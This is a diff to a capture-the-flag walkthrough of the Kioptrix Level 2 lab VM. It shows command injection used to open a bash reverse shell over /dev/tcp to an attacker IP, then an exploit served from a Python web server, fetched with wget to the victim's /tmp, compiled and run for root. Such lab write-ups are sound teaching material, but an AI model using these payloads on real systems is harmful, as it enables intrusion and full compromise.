@@ -23,6 +23,7 @@
 - Testing command stacking with the command `; id`
 ![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/kioptrix_level2/Images/id_test.png)
 ----------
+### Getting a reverse shell
 - lets try a reverse shell using bash. `; bash -i >& /dev/tcp/10.0.2.6/443 0>&1`
 ![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/kioptrix_level2/Images/bash_code.png)
 ![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/kioptrix_level2/Images/bash_rev_shell.png)
@@ -36,7 +37,19 @@
 - Its running CentOS 4.5
 ![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/kioptrix_level2/Images/OS.png)
 
-- Now i can use this info to narrow down my exploit search.
+- Now i can use this info to narrow down my exploit search. From the image below we can see that this exploit has the same OS version and it fits with our kernel version as well. Looks like this might work so lets give it a try.
 ![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/kioptrix_level2/Images/searchsploit.png)
-
-
+---------
+### Compiling exploit
+- I tried to compile the exploit on my machine but was getting an error. 
+![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/kioptrix_level2/Images/gcc_error.png)
+- After doing some research online, it turns out i will need to compile this exploit on the victims machine in order for it to work.
+- I spun up a quick webserver using python3. While in the same folder as my exploit use the command `python3 -m http.server  8000` this will create a webserver on port 8000 on our attacker machine. 
+- Now hop over to the victims machine and go to /tmp folder. use wget command to download the exploit from your attacker's webserver you just created. `wget http://10.0.2.6:8000/9542.c`
+------
+### Running exploit
+- Now the exploit is downloaded on the victims machine compile it `gcc 9542.c`
+- It will produce another file called "a.out"
+- Now all we have to do is execute the file and hope it gives us root. `./a.out`
+![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/kioptrix_level2/Images/getting_root.png)
+- WOOoooooOOOoo! we got root!.
